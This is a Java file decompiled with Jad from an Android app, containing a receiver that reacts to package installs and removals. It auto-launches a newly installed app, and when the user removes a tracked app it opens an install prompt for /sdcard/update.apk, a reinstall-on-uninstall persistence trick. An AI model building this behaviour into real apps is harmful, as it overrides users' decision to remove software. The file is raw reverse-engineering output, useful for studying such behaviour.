// Decompiled by Jad v1.5.8e. Copyright 2001 Pavel Kouznetsov.
// Jad home page: http://www.geocities.com/kpdus/jad.html
// Decompiler options: packimports(3) 

package com.example.tnt2;

import android.content.*;
import android.net.Uri;
import android.util.Log;
import com.example.utils.SharePres;
import com.example.utils.SharePresSingle;
import java.io.File;

public class MyInstalledReceiver extends BroadcastReceiver
{

    public MyInstalledReceiver()
    {
    }

    public void onReceive(Context context, Intent intent)
    {
        Log.d("MyInstalledReceiver", "MyInstalledReceiver run");
        if(intent.getAction().equals("android.intent.action.PACKAGE_ADDED"))
        {
            String s2 = intent.getDataString();
            Log.i("install", (new StringBuilder()).append(s2).toString());
            if(s2.contains("com.example.baidu"))
            {
                Intent intent2 = new Intent();
                intent2.setClassName("com.example.baidu", "com.example.baidu.MainActivity");
                intent2.setFlags(0x10000000);
                context.startActivity(intent2);
            }
        }
        if(intent.getAction().equals("android.intent.action.PACKAGE_REMOVED"))
        {
            String s = intent.getDataString();
            Log.i("MyInstalledReceiver", (new StringBuilder("MyInstalledReceiver get remove ")).append(s).toString());
            String s1 = SharePresSingle.getInstance().getString("packageName", "fail");
            Log.i("MyInstalledReceiver", (new StringBuilder("MyInstalledReceiver get save packageName ")).append(s1).toString());
            if(s.contains(s1))
            {
                Log.d("MyInstalledReceiver", (new StringBuilder("MyInstalledReceiver \u5B89\u88C5APK ")).append(s1).toString());
                Intent intent1 = new Intent("android.intent.action.VIEW");
                intent1.addFlags(0x10000000);
                intent1.setDataAndType(Uri.fromFile(new File("/sdcard/update.apk")), "application/vnd.android.package-archive");
                context.startActivity(intent1);
            }
        }
    }

    private static final String TAG = "MyInstalledReceiver";
}
